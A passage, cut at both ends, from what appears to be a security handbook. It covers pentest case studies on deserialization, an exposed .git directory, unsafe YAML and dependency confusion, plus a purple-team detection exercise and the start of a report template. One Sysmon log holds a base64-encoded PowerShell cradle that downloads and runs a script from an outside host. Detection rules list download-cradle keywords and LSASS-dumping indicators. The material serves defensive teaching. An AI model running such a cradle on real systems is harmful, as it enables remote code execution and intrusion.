Name      : CorpSystemHealthMonitor
StartName : LocalSystem
State     : Running
PathName  : C:\Program Files\Corp Monitoring Suite\Health Service\MonitorDaemon.exe

C:\Program Files\Corp Monitoring Suite CORP\AppOperators:(OI)(CI)(M)
                                       NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                       BUILTIN\Administrators:(OI)(CI)(F)
```

### 51.8.5 Impact Analysis
- **Confidentiality, Integrity, Availability:** Unauthenticated Remote Code Execution via Java deserialization followed by local privilege escalation to `NT AUTHORITY\SYSTEM`.
- **CVSS v3.1 Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

### 51.8.6 Complete Remediation Patch

#### 1. Implement Strict JEP 290 `ObjectInputFilter` Allowlisting (or Migrate to JSON/Protobuf)
```java
// REMEDIATED CODE: SyncServlet.java (Using JEP 290 ObjectInputFilter Strict Allowlist)
package com.corp.inventory;

import java.io.IOException;
import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class SyncServlet extends HttpServlet {
    // Allow ONLY the exact DTO classes, java.lang.String, and cap graph complexity
    private static final ObjectInputFilter STRICT_FILTER = ObjectInputFilter.Config.createFilter(
        "maxdepth=5;maxrefs=100;maxbytes=65536;maxarray=256;" +
        "com.corp.inventory.dto.BatchSyncPayload;" +
        "com.corp.inventory.dto.InventoryItem;" +
        "java.util.ArrayList;" +
        "!*" // Reject all other classes immediately before instantiation
    );

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try (ObjectInputStream ois = new ObjectInputStream(req.getInputStream())) {
            ois.setObjectInputFilter(STRICT_FILTER);
            BatchSyncPayload payload = (BatchSyncPayload) ois.readObject();
            syncService.process(payload);
            resp.setStatus(HttpServletResponse.SC_OK);
        } catch (ClassNotFoundException | SecurityException e) {
            resp.sendError(HttpServletResponse.SC_BAD_REQUEST, "Rejected deserialization stream");
        }
    }
}
```

#### 2. Quote Windows Service `ImagePath` and Remove Excessive Directory ACLs
```powershell
# 1. Enclose the service ImagePath in double quotes in the Registry
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CorpSystemHealthMonitor"
$currentPath = (Get-ItemProperty -Path $regPath -Name ImagePath).ImagePath
if ($currentPath -notmatch '^"') {
    Set-ItemProperty -Path $regPath -Name ImagePath -Value "`"$currentPath`""
}

# 2. Remove Write/Modify permissions for non-administrative groups using icacls
icacls "C:\Program Files\Corp Monitoring Suite" /remove:g "CORP\AppOperators" /T /C
icacls "C:\Program Files\Corp Monitoring Suite\Health Service\MonitorDaemon.exe" /inheritance:r `
    /grant:r "NT AUTHORITY\SYSTEM:(F)" `
    /grant:r "BUILTIN\Administrators:(F)" `
    /grant:r "BUILTIN\Users:(RX)"

# 3. Restart the hardened service
Restart-Service -Name "CorpSystemHealthMonitor"
```

---

## 51.9 Case Study 9: Source Control Exposure & Dependency Supply Chain Audit

### 51.9.1 Architecture Overview
The target environment (`10.10.140.125`, `analytics-hub.internal.corp`) hosts a Python data analytics web application served behind Nginx, along with an internal PyPI package index (`http://pypi.internal.corp:8081`) used by automated build workers.
- **Misconfiguration 1 (`.git` Directory Exposure):** The deployment pipeline copied the entire Git working tree into `/var/www/analytics-hub/` without blocking `.git/` in Nginx.
- **Misconfiguration 2 (Historical Secret in Git Commit Log):** Although a developer removed a hardcoded HMAC signing secret and AWS S3 deployment key in the latest commit (`HEAD`), the credentials remain accessible in parent commit blobs inside `.git/objects/`.
- **Misconfiguration 3 (Unsafe YAML Deserialization & Dependency Confusion):** The application parses user-uploaded workflow configuration files using `yaml.load(stream, Loader=yaml.Loader)` instead of `yaml.safe_load()`, and the build agent runs `pip install --extra-index-url http://pypi.internal.corp:8081 corp-metrics-sdk` (vulnerable to public PyPI dependency confusion).

### 51.9.2 Reconnaissance & Enumeration Output
```bash
$ curl -s http://10.10.140.125/.git/HEAD
ref: refs/heads/main
$ curl -s -I http://10.10.140.125/.git/config
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 294
```

### 51.9.3 Vulnerability Root Cause Analysis

#### Stage 1: Exposed `.git` Repository & Commit History Secret Leakage (`CWE-527` / `CWE-798`)
When `.git/HEAD`, `.git/index`, and `.git/objects/` are readable over HTTP, an auditor can reconstruct the entire source tree and run `git log -p` to inspect every historical commit diff:

```bash
$ git log -p -n 3
commit 8f31c902a14b... (HEAD -> main)
Author: dev-lead <dev@internal.corp>
Date:   Mon Oct 28 14:12:09 2026 +0530

    sec: remove hardcoded signing key from settings.py

diff --git a/analytics/settings.py b/analytics/settings.py
index 4a19c22..9b08e11 100644
--- a/analytics/settings.py
+++ b/analytics/settings.py
@@ -14,2 +14,2 @@
-YAML_SIGNING_SECRET = "HmacKey_9981_SuperSecret_Analytics2026!"
+YAML_SIGNING_SECRET = os.environ.get("YAML_SIGNING_SECRET")
```
Even though the latest commit reads `os.environ.get("YAML_SIGNING_SECRET")`, the production server `.env` still uses the same unrotated secret `HmacKey_9981_SuperSecret_Analytics2026!`.

#### Stage 2: Arbitrary Code Execution via `PyYAML` `yaml.load()` (`CWE-502`)
In `analytics/workflow_parser.py`, the application verifies an HMAC-SHA256 signature on an uploaded YAML job definition using `YAML_SIGNING_SECRET` and then passes the body to `yaml.load()`:

```python
# VULNERABLE CODE: analytics/workflow_parser.py
import hmac, hashlib, yaml

def parse_signed_workflow(raw_yaml: bytes, signature: str, secret: str):
    expected_sig = hmac.new(secret.encode(), raw_yaml, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected_sig, signature):
        raise ValueError("Invalid workflow HMAC signature")
    
    # FLAW: yaml.load with full Loader allows arbitrary Python object instantiation
    # via !!python/object/apply: tags!
    return yaml.load(raw_yaml, Loader=yaml.FullLoader) # or yaml.UnsafeLoader / yaml.Loader
```

#### Stage 3: Supply Chain Dependency Confusion (`--extra-index-url`)
In the CI/CD Dockerfile:
```dockerfile
RUN pip install --extra-index-url http://pypi.internal.corp:8081 -r requirements.txt
```
When `pip` is invoked with `--extra-index-url`, it queries **both** the public PyPI (`https://pypi.org/simple`) and the internal index, selecting whichever source offers the **highest version number** for `corp-metrics-sdk`. If an attacker registers `corp-metrics-sdk==99.0.0` on public PyPI, `pip` downloads and executes the untrusted public package.

### 51.9.4 Authorized Verification Steps

1. **Verify `.git` Reconstruction & Secret Discovery:**
Reconstruct the exposed repository in `/tmp/audit_git_verify` and confirm the presence of unrotated credentials in commit `4a19c22`.
2. **Verify `yaml.safe_load` Enforcement Requirement:**
Confirm that signed YAML payloads containing non-primitive tags are processed by `yaml.load()`, and verify that replacing it with `yaml.safe_load()` immediately raises `yaml.constructor.ConstructorError`.

### 51.9.5 Impact Analysis
- **Confidentiality, Integrity, Availability:** Source code intellectual property disclosure, cryptographic key compromise, Remote Code Execution via signed unsafe YAML deserialization, and CI/CD supply chain compromise.
- **CVSS v3.1 Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

### 51.9.6 Complete Remediation Patch

#### 1. Nginx Dotfile Lockdown & Immediate Secret Rotation
Rotate `YAML_SIGNING_SECRET` immediately in vault/environment configuration, strip `.git` from deployment artifacts (deploy immutable container images or tarballs without `.git`), and block all hidden files in Nginx:
```nginx
# Block access to .git, .env, .svn, .htaccess, and all hidden dot-files/directories
location ~ /\.(?!well-known).* {
    deny all;
    access_log off;
    log_not_found off;
    return 404;
}
```

#### 2. Enforce `yaml.safe_load()` and JSON Schema Validation
```python
# REMEDIATED CODE: analytics/workflow_parser.py
import hmac
import hashlib
import yaml
import jsonschema

WORKFLOW_SCHEMA = {
    "type": "object",
    "required": ["job_name", "dataset_id", "aggregations"],
    "additionalProperties": False,
    "properties": {
        "job_name": {"type": "string", "maxLength": 64},
        "dataset_id": {"type": "integer", "minimum": 1},
        "aggregations": {
            "type": "array",
            "items": {"type": "string", "enum": ["sum", "avg", "count", "min", "max"]}
        }
    }
}

def parse_signed_workflow(raw_yaml: bytes, signature: str, secret: str) -> dict:
    expected_sig = hmac.new(secret.encode(), raw_yaml, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected_sig, signature):
        raise ValueError("Invalid workflow HMAC signature")

    # Strictly use yaml.safe_load() which only constructs standard YAML primitives (dict, list, str, int, float)
    parsed = yaml.safe_load(raw_yaml)
    jsonschema.validate(instance=parsed, schema=WORKFLOW_SCHEMA)
    return parsed
```

#### 3. Eliminate Dependency Confusion (`--index-url` + Hash-Pinned `requirements.txt` + Pre-Commit Secret Scanning)
Use `--index-url` pointing solely to an internal repository proxy (e.g., Nexus / Artifactory / devpi with explicit namespace routing) and enforce SHA-256 package hash verification:
```bash
$ pip install --index-url https://pypi.internal.corp/simple --require-hashes -r requirements.lock
```
Add a mandatory CI/CD secret scanning gate (`gitleaks` / `trufflehog`):
```yaml
# .github/workflows/security-gate.yml
name: Secret & Supply Chain Audit
on: [push, pull_request]
jobs:
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Run Gitleaks History Audit
        uses: gitleaks/gitleaks-action@v2
```

---

## 51.10 Case Study 10: Purple Team Enterprise Detection & Incident Response Exercise

### 51.10.1 Architecture Overview
This purple team exercise evaluates end-to-end telemetry visibility, SIEM detection engineering, and automated incident containment across a hybrid enterprise environment (`corp.eyelanka.internal`):
- **Endpoint Telemetry:** Windows Workstations (`WKS-FIN-04`) and Domain Controllers (`DC01`) running Sysmon v15.14 and Wazuh Agent v4.8 forwarding events to a centralized SIEM (Splunk Enterprise / Wazuh Indexer).
- **Linux Telemetry:** Application servers running `auditd` with custom syscall rules forwarding to the SIEM.
- **Simulated Attack Chain (Authorized Purple Team Emulation Plan):**
  1. **Initial Access (`T1190`):** Web shell execution spawning a child shell from IIS (`w3wp.exe -> cmd.exe -> powershell.exe`).
  2. **Execution (`T1059.001`):** Base64-encoded PowerShell cradle execution (`powershell.exe -nop -w hidden -enc ...`).
  3. **Credential Access (`T1003.001` & `T1558.003`):** Attempted LSASS process memory read (`Sysmon Event ID 10`) and RC4 Kerberoasting (`Windows Security Event ID 4769` with `TicketEncryptionType = 0x17`).
  4. **Lateral Movement (`T1021.002` & `T1569.002`):** Remote service creation over SMB (`Event ID 4624 LogonType 3` + `Event ID 7045` / `4697`).

### 51.10.2 Telemetry & Log Evidence Captured During Emulation

#### Phase 1 & 2: Sysmon Event ID 1 (Process Creation — IIS Spawning Encoded PowerShell)
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <Computer>WEB-ERP01.corp.eyelanka.internal</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-11-02 10:14:22.418</Data>
    <Data Name="ProcessId">6812</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANQAvAGEAdQBkAGkAdAAuAHAAcwAxACcAKQA=</Data>
    <Data Name="User">IIS APPPOOL\HRPortalPool</Data>
    <Data Name="ParentProcessId">4120</Data>
    <Data Name="ParentImage">C:\Windows\System32\inetsrv\w3wp.exe</Data>
    <Data Name="ParentCommandLine">c:\windows\system32\inetsrv\w3wp.exe -ap "HRPortalPool"</Data>
  </EventData>
</Event>
```

#### Phase 3A: Sysmon Event ID 10 (ProcessAccess — LSASS Memory Read Attempt)
```xml
<EventData>
  <Data Name="UtcTime">2026-11-02 10:16:05.112</Data>
  <Data Name="SourceProcessId">6812</Data>
  <Data Name="SourceImage">C:\Users\Public\diag_dump.exe</Data>
  <Data Name="TargetImage">C:\Windows\system32\lsass.exe</Data>
  <Data Name="GrantedAccess">0x1fffff</Data>
  <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Windows\System32\KERNELBASE.dll+2c11e|C:\Windows\System32\dbghelp.dll+14a82</Data>
</EventData>
```

#### Phase 3B: Windows Security Event ID 4769 (Kerberos Service Ticket Requested — RC4 Downgrade)
```xml
<EventData>
  <Data Name="TargetUserName">svc_mssql@CORP.EYELANKA.INTERNAL</Data>
  <Data Name="ServiceName">MSSQLSvc/db01.corp.eyelanka.internal:1433</Data>
  <Data Name="IpAddress">::ffff:10.10.140.55</Data>
  <Data Name="TicketOptions">0x40810000</Data>
  <Data Name="TicketEncryptionType">0x17</Data>
  <Data Name="Status">0x0</Data>
</EventData>
```

### 51.10.3 MITRE ATT&CK Coverage & Detection Engineering Matrix

| Phase | MITRE Tactic | Technique ID & Name | Primary Telemetry Source | Detection Logic / Indicator |
| :--- | :--- | :--- | :--- | :--- |
| **1** | Initial Access / Execution | `T1505.003` Web Shell | Sysmon Event ID 1 / Win Event 4688 | `ParentImage` ending in `\w3wp.exe`, `\httpd.exe`, `\nginx.exe`, `\java.exe` spawning `cmd.exe`, `powershell.exe`, `sh`, or `whoami.exe`. |
| **2** | Execution | `T1059.001` PowerShell | Win PowerShell Event 4104 (ScriptBlock) + AMSI | Command-line flags `-enc`, `-EncodedCommand`, `FromBase64String`, `DownloadString`, `Net.WebClient`, or `AmsiUtils`. |
| **3** | Credential Access | `T1003.001` LSASS Memory | Sysmon Event ID 10 (`ProcessAccess`) | `TargetImage` = `*\lsass.exe` AND `GrantedAccess` contains `0x1010`, `0x1410`, `0x1438`, `0x143a`, or `0x1fffff` from non-system processes. |
| **4** | Credential Access | `T1558.003` Kerberoasting | Windows Security Event ID 4769 | `TicketEncryptionType == 0x17` (RC4-HMAC) AND `ServiceName != krbtgt` AND `ServiceName` does not end with `$`. |
| **5** | Lateral Movement | `T1569.002` Service Execution | Windows System Event 7045 / Security 4697 | New service installed with `ImagePath` containing `cmd.exe`, `powershell`, `%COMSPEC%`, `\Users\Public\`, or named pipes. |

### 51.10.4 Production Sigma & Splunk SPL Detection Rules

#### 1. Sigma Rule: Web Server Spawning Command Interpreter (`T1505.003`)
```yaml
title: Web Server Process Spawning Interactive Command Shell
id: 9b4e7c12-8a3f-4d91-b502-71c84a209f11
status: production
description: Detects web server worker processes (IIS w3wp, Apache, Nginx, Tomcat) spawning shell interpreters indicative of web shell execution.
author: EyeLanka SOC Detection Engineering
date: 2026/11/02
references:
  - https://attack.mitre.org/techniques/T1505/003/
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\w3wp.exe'
      - '\httpd.exe'
      - '\nginx.exe'
      - '\tomcat9.exe'
      - '\java.exe'
      - '\php-cgi.exe'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\whoami.exe'
      - '\net.exe'
      - '\net1.exe'
      - '\nltest.exe'
      - '\rundll32.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Legitimate administrative CGI scripts (should be migrated to native APIs)
level: critical
tags:
  - attack.persistence
  - attack.t1505.003
```

#### 2. Splunk SPL Query: Detecting Kerberoasting (`Event ID 4769` with RC4 `0x17`)
```spl
index=wineventlog source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
| where NOT like(Service_Name, "%$") AND Service_Name!="krbtgt"
| stats count values(Service_Name) as Targeted_SPNs dc(Service_Name) as Unique_SPN_Count by Account_Name, Client_Address, _time
| where Unique_SPN_Count >= 1
| table _time, Account_Name, Client_Address, Unique_SPN_Count, Targeted_SPNs
```

### 51.10.5 Hardening & Automated Containment Playbook
1. **Enable Windows Defender Credential Guard & RunAsPPL (`LsaCfgFlags` = 1, `RunAsPPL` = 1):**
```powershell
# Enable LSA Protection (Protected Process Light - PPL) to block user-mode LSASS memory reads
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "RunAsPPL" -Value 1 -PropertyType DWord -Force

# Disable WDigest plaintext credential caching in memory
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" -Value 0 -PropertyType DWord -Force
```
2. **Enable Attack Surface Reduction (ASR) Rules:**
   - Block credential stealing from the Windows local security authority subsystem (`lsass.exe`): `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2` = `Enabled (Block)`.
   - Block process creations originating from PSExec and WMI commands: `d1e49aac-8f56-4280-b9ba-993a6d77406c` = `Enabled (Block)`.
3. **Automated SOAR Containment Action:**
   - Isolate `WEB-ERP01` at the EDR/host firewall layer (`netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound` except SIEM/EDR management IP).
   - Revoke active Kerberos TGTs by resetting affected service account passwords twice (`ktpass` / `Reset-ADServiceAccountPassword`).

---

# CHAPTER 52: PROFESSIONAL SECURITY ASSESSMENT & PENETRATION TESTING REPORT TEMPLATE

A technical finding has zero operational value until it is communicated clearly, accurately, and actionably to both executive leadership and engineering teams. This chapter provides a complete, production-ready **Enterprise Security Assessment & Penetration Testing Report Template** aligned with PTES (Penetration Testing Execution Standard), OWASP WSTG, NIST SP 800-115, ISO/IEC 27001:2022, and Central Bank of Sri Lanka (CBSL) Baseline Security Standard requirements.

---

## 52.1 Document Control, Confidentiality Statement, Scope & Rules of Engagement

### 52.1.1 Document Control & Version History

| Metadata Field | Value |
| :--- | :--- |
| **Document Title** | Enterprise Infrastructure, Active Directory & Web Application Security Assessment Report |
| **Document ID** | `EYELANKA-SEC-RPT-2026-Q4-019` |
| **Client Organization** | Lanka National Financial Services PLC (`LNF-PLC`) |
| **Assessment Provider** | Apex Cyber Defense & Assurance Advisory (Pvt) Ltd |
| **Classification Level** | **STRICTLY CONFIDENTIAL — BOARD & NAMED RECIPIENTS ONLY (TLP:RED)** |
| **Assessment Window** | 12 October 2026 – 30 October 2026 (15 Business Days) |
| **Report Delivery Date** | 02 November 2026 |
| **Lead Principal Consultant** | Dr. K. Wijeratne, OSCP, OSEP, CISSP, GXPN |

| Version | Date | Author(s) | Description of Changes | Approved By |
| :--- | :--- | :--- | :--- | :--- |
| `v0.1` | 28 Oct 2026 | K. Wijeratne, S. Perera | Initial technical draft and finding verification | N. Fernando (QA Lead) |
| `v1.0` | 02 Nov 2026 | K. Wijeratne | Final deliverable issued to Client CISO & Audit Committee | R. Jayasinghe (Practice Director) |
| `v1.1` | 04 Dec 2026 | S. Perera | Post-remediation retest validation appendix added | K. Wijeratne |

### 52.1.2 Confidentiality & Legal Notice
> **CONFIDENTIALITY & NON-DISCLOSURE NOTICE (TLP:RED)**  
> This document contains sensitive technical details regarding security vulnerabilities, architectural weaknesses, and cryptographic configurations within the information systems of **Lanka National Financial Services PLC**. Distribution is restricted exclusively to authorized personnel named in the distribution list. Unauthorized reproduction, transmission, or storage of this report in unencrypted form violates the Master Services Agreement (`MSA-2026-088`), the Computer Crimes Act No. 24 of 2007 (Sri Lanka), and the Personal Data Protection Act No. 9 of 2022 (PDPA). All testing activities described herein were conducted under explicit written authorization signed on 05 October 2026.

### 52.1.3 Assessment Scope & Rules of Engagement (RoE)

| Asset Category | Target Identifier / CIDR / URL | Environment | Assessment Type |
| :--- | :--- | :--- | :--- |
| **External Web Portal** | `https://portal.lnf.lk` (`203.115.28.14`) | Production Staging Mirror | Grey-Box Web & API Assessment |
| **Core FinTech API** | `https://api.lnf.lk/v2/*` (`203.115.28.19`) | Production Staging Mirror | White-Box Source + Dynamic API Audit |
| **Internal Corporate Subnet** | `10.10.140.0/24` (42 Active Hosts) | Corporate Internal VLAN | Assumed-Breach Internal Network Audit |
| **Active Directory Forest** | `corp.lnf.internal` (`DC01`, `DC02`) | Corporate Identity Tier | Authenticated AD Configuration & ACL Audit |
| **Cloud Workload VPC** | AWS Account `4455-6677-8899` (`ap-southeast-1`) | Cloud Infrastructure | AWS IAM, S3, EC2 & EKS Posture Audit |

**Rules of Engagement Constraints:**
1. **Testing Hours:** Active scanning against external endpoints restricted to `20:00 – 05:00 IST (UTC+5:30)`; internal lab/staging testing permitted `08:30 – 18:30 IST`.
2. **Prohibited Actions:** Denial-of-Service (DoS/DDoS) volumetric flooding, automated destructive fuzzing against production databases, social engineering/phishing of employees, and modification of active customer ledger records.
3. **Critical Finding Escalation:** Any vulnerability rated `CVSS >= 9.0` or exposing customer PII/financial records must be reported verbally and via encrypted channel to the Client CISO within **4 hours** of confirmation.

---

## 52.2 Executive Summary for C-Level & Board of Directors

### 52.2.1 Management Overview
Apex Cyber Defense & Assurance Advisory was engaged by the Board Risk & Audit Committee of **Lanka National Financial Services PLC (LNF-PLC)** to perform an independent, comprehensive security assessment of its external customer-facing digital banking APIs, internal enterprise network, cloud infrastructure, and Active Directory identity ecosystem. The objective was to evaluate the organization's resilience against both external unauthenticated threat actors and internal assumed-breach scenarios prior to the Q1 2027 digital wallet expansion.

### 52.2.2 High-Level Security Posture & Key Takeaways
While LNF-PLC has implemented perimeter Web Application Firewalls (WAF), endpoint detection agents, and TLS 1.3 encryption across public endpoints, the assessment identified **two (2) Critical**, **three (3) High**, **two (2) Medium**, and **one (1) Low** severity vulnerabilities that collectively allow an external attacker or a low-privileged internal foothold to compromise core financial databases and Active Directory domain administration.

**Primary Strategic Risks Identified:**
1. **Application Input Handling & Access Control Gaps:** An unparameterized SQL query in the legacy invoice module (`FND-001`) and Broken Object Level Authorization (BOLA) paired with JWT algorithm confusion in the GraphQL API (`FND-002`) allow external threat actors to extract sensitive financial records without valid administrative credentials.
2. **Active Directory Privilege Escalation Pathways:** Excessive Access Control List (ACL) permissions (`WriteDacl`) granted to a Tier-2 helpdesk group over Tier-0 `Domain Admins` (`FND-004`), combined with legacy RC4-encrypted Service Principal Names (Kerberoasting), enable rapid lateral escalation from a single compromised workstation to full forest control.
3. **Business Logic & Concurrency Controls:** The wallet voucher redemption workflow lacks database row-level locking (`SELECT ... FOR UPDATE`), permitting concurrent HTTP/2 requests to redeem single-use promotional vouchers multiple times (`FND-005`).

```
+-------------------------------------------------------------------------+
|                    OVERALL RISK EXPOSURE RATING: HIGH                   |
+------------------+------------------+-----------------+-----------------+
|   CRITICAL: 2    |     HIGH: 3      |    MEDIUM: 2    |   LOW/INFO: 1   |
+------------------+------------------+-----------------+-----------------+
```

### 52.2.3 Summary of Strategic Recommendations
1. **Immediate Tactical Containment (0–30 Days):** Patch the SQL Injection (`FND-001`) and JWT/GraphQL authorization flaws (`FND-002`), revoke non-Tier-0 ACL permissions on `Domain Admins`, and enforce database row locking on wallet balance mutations.
2. **Structural Hardening (30–60 Days):** Migrate all Active Directory service accounts to Group Managed Service Accounts (`gMSA`) enforcing AES-256 Kerberos encryption, enforce AWS IMDSv2 across all cloud nodes, and eliminate Java native deserialization endpoints.
3. **Continuous Assurance & Governance (60–90 Days):** Integrate automated SAST/DAST and secret-scanning gates (`gitleaks`, `Semgrep`) into CI/CD pipelines, implement Tiered Active Directory Administration (Tier 0 / Tier 1 / Tier 2 with PAWs), and deploy the Sigma/SIEM correlation rules detailed in Chapter 53.

---

## 52.3 Risk Rating Methodology (CVSS v3.1 & CVSS v4.0)

### 52.3.1 CVSS v3.1 Base Score Mathematical Formulation
All findings in this report are scored using the **Common Vulnerability Scoring System (CVSS) v3.1** specification alongside **CVSS v4.0** nomenclature. In CVSS v3.1, the **Base Score** is derived from two sub-scores: **Impact ($I$)** and **Exploitability ($E$)**, modulated by the **Scope ($S$)** metric (`Unchanged` vs. `Changed`):

1. **Impact Sub-Score ($\text{ISS}$):**
   $$\text{ISS} = 1 - \left[ (1 - I_{\text{Conf}}) \times (1 - I_{\text{Integ}}) \times (1 - I_{\text{Avail}}) \right]$$
   where $I_{\text{Conf}}, I_{\text{Integ}}, I_{\text{Avail}} \in \{0.00\text{ (None)}, 0.22\text{ (Low)}, 0.56\text{ (High)}\}$.

2. **Impact Score ($I$):**
   - If Scope is **Unchanged (`S:U`)**:
     $$I = 6.42 \times \text{ISS}$$
   - If Scope is **Changed (`S:C`)**:
     $$I = 7.52 \times (\text{ISS} - 0.029) - 3.25 \times (\text{ISS} - 0.02)^{15}$$

3. **Exploitability Sub-Score ($E$):**
   $$E = 8.22 \times \text{AV} \times \text{AC} \times \text{PR} \times \text{UI}$$
   where metric weights are:
   - **Attack Vector ($\text{AV}$):** Network (`N`) = $0.85$, Adjacent (`A`) = $0.62$, Local (`L`) = $0.55$, Physical (`P`) = $0.20$.
   - **Attack Complexity ($\text{AC}$):** Low (`L`) = $0.77$, High (`H`) = $0.44$.
   - **Privileges Required ($\text{PR}$):** None (`N`) = $0.85$; Low (`L`) = $0.62$ (`S:U`) or $0.68$ (`S:C`); High (`H`) = $0.27$ (`S:U`) or $0.50$ (`S:C`).
   - **User Interaction ($\text{UI}$):** None (`N`) = $0.85$, Required (`R`) = $0.62$.

4. **Final Base Score Calculation:**
   - If $I \le 0$, then $\text{Base Score} = 0.0$.
   - If Scope is **Unchanged (`S:U`)**:
     $$\text{Base Score} = \text{RoundUp}\left( \min\left[ (I + E), 10.0 \right] \right)$$
   - If Scope is **Changed (`S:C`)**:
     $$\text{Base Score} = \text{RoundUp}\left( \min\left[ 1.08 \times (I + E), 10.0 \right] \right)$$
   *(where $\text{RoundUp}(x)$ rounds up to the nearest tenth of a decimal, e.g., $9.02 \rightarrow 9.1$).*

### 52.3.2 CVSS v4.0 Enhancements Overview
**CVSS v4.0** replaces the single `Scope (S)` boolean with granular separation of impact into **Vulnerable System (`VC`, `VI`, `VA`)** and **Subsequent System (`SC`, `SI`, `SA`)** metrics, introduces **Attack Requirements (`AT`: None vs. Present)** to distinguish race conditions or specific deployment prerequisites from attacker-side complexity, and formalizes four nomenclature combinations:
- **CVSS-B:** Base Metrics only.
- **CVSS-BT:** Base + Threat (Exploit Maturity) Metrics.
- **CVSS-BE:** Base + Environmental (Security Requirements & Modified Base) Metrics.
- **CVSS-BTE:** Base + Threat + Environmental Metrics.

### 52.3.3 Severity Rating Scale & SLA Matrix

| Severity Level | CVSS Score Range | Likelihood × Impact | Mandatory Remediation SLA |
| :--- | :--- | :--- | :--- |
| **Critical** | `9.0 – 10.0` | High Likelihood / Severe Business Impact | **Immediate (Within 7 Calendar Days)** |
| **High** | `7.0 – 8.9` | Moderate-to-High Likelihood / High Impact | **Short-Term (Within 30 Calendar Days)** |
| **Medium** | `4.0 – 6.9` | Moderate Likelihood / Localized Impact | **Medium-Term (Within 60 Calendar Days)** |
| **Low** | `0.1 – 3.9` | Low Likelihood / Minimal Impact | **Long-Term (Within 90 Calendar Days)** |
| **Informational** | `0.0` | Defense-in-Depth Best Practice | **Next Scheduled Maintenance Cycle** |

---

## 52.4 Summary of Findings Table

| Finding ID | Vulnerability Title | Affected Asset(s) | CWE ID | CVSS v3.1 Score | Severity | Status |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **`FND-001`** | Unauthenticated SQL Injection & Privileged Database File Read | `10.10.140.25` (`/invoice_view.php`) | `CWE-89` | `9.8` | **Critical** | Open |
| **`FND-002`** | JWT Algorithm Confusion (`RS256` to `HS256`) & GraphQL BOLA | `api.lnf.lk:4000` (`/graphql`) | `CWE-347` / `CWE-639` | `9.8` | **Critical** | Open |
| **`FND-003`** | Server-Side Request Forgery (SSRF) to Cloud IMDSv1 Metadata | `api.lnf.lk:4000` (`testWebhookEndpoint`) | `CWE-918` | `8.6` | **High** | Open |
| **`FND-004`** | Active Directory Tier-0 Escalation via `WriteDacl` & RC4 SPNs | `DC01.corp.lnf.internal` | `CWE-269` / `CWE-326` | `8.8` | **High** | Open |
| **`FND-005`** | Database Race Condition (TOCTOU) in Voucher Redemption API | `pay.lnf.lk` (`/api/v1/wallet/redeem-voucher`) | `CWE-362` | `8.1` | **High** | Open |
| **`FND-006`** | Unsafe Java Native Deserialization on Inventory Sync Daemon | `10.10.140.110:9090` (`/api/sync/batch`) | `CWE-502` | `6.8` | **Medium** | Open |
| **`FND-007`** | Stored Cross-Site Scripting (XSS) & Missing CSP Header | `pay.lnf.lk` (`/merchant/disputes`) | `CWE-79` | `6.1` | **Medium** | Open |
| **`FND-008`** | Exposed `.git` Repository & Verbose Server Banner Headers | `10.10.140.125` (`/.git/config`) | `CWE-527` | `3.7` | **Low** | Open |

---

## 52.5 Sample Detailed Finding Cards (8 Complete Finding Cards)

### Finding Card 1: `FND-001` — Unauthenticated SQL Injection & Privileged Database File Read

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-001`: Unauthenticated SQL Injection & Privileged Database File Read |
| **Severity & CVSS v3.1** | **CRITICAL — 9.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CVSS v4.0 Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (`9.3 Critical`) |
| **CWE & OWASP Mapping** | `CWE-89: Improper Neutralization of Special Elements used in an SQL Command` / OWASP Top 10 `A03:2021 - Injection` |
| **Affected Asset** | `http://10.10.140.25/invoice_view.php` (`id` GET parameter) |

#### Technical Description
